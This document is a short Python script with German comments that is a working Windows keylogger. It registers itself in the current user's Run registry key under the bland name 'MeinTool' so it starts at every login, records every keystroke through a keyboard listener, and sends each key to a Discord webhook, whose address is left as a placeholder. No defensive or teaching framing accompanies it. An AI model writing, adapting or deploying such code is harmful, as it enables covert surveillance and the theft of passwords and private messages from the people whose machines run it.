import os
import sys
import time
import winreg
from pynput import keyboard
import requests

WEBHOOK_URL = "https://your.webhook.url.here"  # <-- DEINE URL SICHER HALTEN

def add_to_startup():
    """Trägt das Programm in den Windows-Autostart ein."""
    try:
        file_path = os.path.realpath(sys.argv[0])
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "MeinTool", 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(key)
        print("Autostart-Eintrag erstellt.")
    except Exception as e:
        print(f"Fehler beim Eintrag in Autostart: {e}")

def send_to_discord(content):
    data = {"content": content}
    try:
        requests.post(WEBHOOK_URL, json=data)
    except Exception as e:
        print(f"Fehler beim Senden an Discord: {e}")

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            send_to_discord(f"Taste gedrückt: {key.char}")
        else:
            send_to_discord(f"Spezialtaste gedrückt: {key}")
    except Exception as e:
        print(f"Fehler: {e}")

def main():
    add_to_startup()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()

